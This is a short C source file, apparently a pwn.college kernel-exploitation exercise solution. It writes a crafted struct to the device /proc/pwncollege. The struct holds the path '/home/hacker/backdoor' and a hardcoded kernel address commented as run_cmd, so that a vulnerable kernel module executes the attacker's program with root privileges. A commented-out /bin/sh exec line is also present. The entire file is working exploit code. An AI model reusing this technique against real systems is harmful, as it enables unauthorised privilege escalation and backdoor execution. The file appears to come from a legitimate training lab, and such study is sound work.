#include<stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include<assert.h>
#include <string.h>
#include <stdint.h>
struct ans{
    char shellcode[256] ;
    uint64_t* addr ;
};
typedef struct ans Ans;
int main(){

    Ans exp;
    int fd ;
    strcpy(exp.shellcode,"/home/hacker/backdoor\x00");
    exp.addr = (uint64_t*) 0xffffffff81089570; // run_cmd

    fd = open("/proc/pwncollege",2);
    assert(fd >0);

    write(fd,&exp,0x108);
    //execl("/bin/sh","/bin/sh",0);
    return 0 ;
}
